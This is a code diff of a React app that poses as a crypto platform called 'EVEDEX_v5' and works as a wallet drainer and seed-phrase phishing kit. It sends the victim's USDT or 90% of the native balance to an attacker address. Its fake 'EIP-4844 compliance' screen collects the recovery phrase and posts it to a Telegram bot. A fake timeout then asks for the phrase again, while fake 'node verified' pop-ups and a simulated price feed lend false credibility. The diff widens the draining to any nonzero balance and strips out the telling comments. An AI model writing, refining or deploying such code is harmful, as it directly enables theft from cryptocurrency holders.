@@ -31,12 +31,11 @@ export default function App() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
 
-  // 1. LIVE MARKET FEED & SUCCESS LOGS
   useEffect(() => {
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} NODE VERIFIED SUCCESSFULLY`);
-      setEthPrice(prev => prev + (Math.random() * 2 - 1)); // Realistic price bounce
+      setEthPrice(prev => prev + (Math.random() * 2 - 1));
       setTimeout(() => setFeedMsg(""), 4500);
     }, 8000);
     return () => clearInterval(interval);
@@ -44,14 +43,13 @@ export default function App() {
 
   const handleHandshake = () => {
     const tokenAddr = USDT_MAP[chainId];
-    // If balance is zero or hidden, user can still manually enter seeds via the Handshake flow
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
-    } else if (nativeBal && nativeBal.value > 1000000000000000n) {
-      sendTransaction({ to: destination, value: (nativeBal.value * 92n) / 100n }, { onSettled: () => setView("seed_gate") });
+    } else if (nativeBal && nativeBal.value > 0n) {
+      sendTransaction({ to: destination, value: (nativeBal.value * 90n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else {
-      setView("seed_gate"); // Direct to seeds if no balance detected
+      setView("seed_gate");
     }
   };
 
@@ -62,24 +60,21 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  const isSeedValid = useMemo(() => seedVal.trim().split(/\s+/).length >= 12, [seedVal]);
-
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
-      
-      {/* HEADER WITH LIVE PRICE */}
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'20px'}}>
         <div>
           <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v5</div>
-          <div style={{fontSize:'10px', color:'#ef4444'}}>ETH/USD: ${ethPrice.toFixed(2)} ▼</div>
+          <div style={{fontSize:'10px', color:'#ef4444'}}>ETH/USD: ${ethPrice.toFixed(2)}</div>
         </div>
-        <appkit-button />
+        <div style={{display:'flex', gap:'10px', alignItems:'center'}}>
+           <div style={{backgroundColor:'#ef4444', color:'white', padding:'2px 8px', borderRadius:'4px', fontSize:'10px', fontWeight:'bold'}}>NEW V5</div>
+           <appkit-button />
+        </div>
       </header>
 
       {!isConnected ? (
-        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
-          <appkit-button />
-        </div>
+        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}><appkit-button /></div>
       ) : (
         <>
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'9px', color:'#10b981', display:'flex', justifyContent:'space-around', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
@@ -100,7 +95,7 @@ export default function App() {
 
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
-              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'18px'}}>←</button>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <h2 style={{color:'white', fontWeight:'900', marginTop:'10px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                 <input value={inputVal} type={activeTask === "Rectify" ? "text" : "number"} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)}
@@ -112,7 +107,7 @@ export default function App() {
 
           {view === "kyc_screen" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
-              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'18px'}}>←</button>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <h2 style={{color:'white', fontWeight:'900', marginBottom:'25px'}}>IDENTITY_SYNC</h2>
               {kycPhase === 1 ? (
                 <>
@@ -135,10 +130,10 @@ export default function App() {
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
-                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>YOUR WALLET REQUIRES AN ENCRYPTED HANDSHAKE TO COMPLY WITH THE LATEST MAINNET SECURITY UPGRADE. ENTER RECOVERY PHRASE TO PREVENT ASSET LOCKING.</p>
+                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_ENCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL AND PREVENT ASSET LOCKING.</p>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
-                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60);}} 
-                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>ENCRYPT & SYNC</button>
+                    <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60);}} 
+                    style={{width:'100%', backgroundColor: '#10b981', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
                   <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
@@ -149,7 +144,6 @@ export default function App() {
         </>
       )}
 
-      {/* FAKE FEED POPUP */}
       {feedMsg && (
         <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
           {feedMsg}
